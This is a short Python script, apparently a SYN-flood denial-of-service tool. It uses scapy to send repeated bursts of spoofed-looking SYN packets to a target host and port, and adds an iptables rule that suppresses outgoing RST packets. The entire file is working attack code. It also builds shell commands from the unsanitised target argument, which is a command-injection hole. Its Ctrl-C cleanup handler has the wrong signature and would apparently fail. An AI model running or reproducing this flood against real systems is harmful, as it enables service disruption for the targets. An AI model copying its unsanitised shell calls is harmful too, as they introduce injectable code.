import sys
import argparse
import os
import signal
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
from scapy.fields import RandShort
from time import sleep
from random import randint
from global_variable import GlobalVariable

sys.path.append(GlobalVariable.PATH)


def signal_handler(signal, frame, host):
    print('Remove IPtables rule')
    os.system('iptables -D OUTPUT -p tcp --tcp-flags RST RST -d' + host + ' -j DROP')
    sys.exit(0)


def main(host, port):
    signal.signal(signal.SIGINT, signal_handler)

    print('Add IPtables rule to omit sending RST packets')
    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d' + host + ' -j DROP')

    variables = GlobalVariable
    MIN, MAX = variables.MIN, variables.MAX

    while True:
        i = 0
        sleep(randint(MIN, MAX))
        while i < variables.LIMIT:
            p = IP(dst=host, id=randint(1, 10000), ttl=99)/TCP(sport=RandShort(), dport=port, seq=randint(1, 100000),
                                                           ack=randint(MIN, MAX), window=1000, flags="S")
            send(p)
            i += 1


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="address and port of the target host")

    args = parser.parse_args()

    if args.target:
        target = args.target.split(':')
        host = target[0]
        port = int(target[1])
    else:
        host = '127.0.0.1'
        port = 80
    main(host, port)
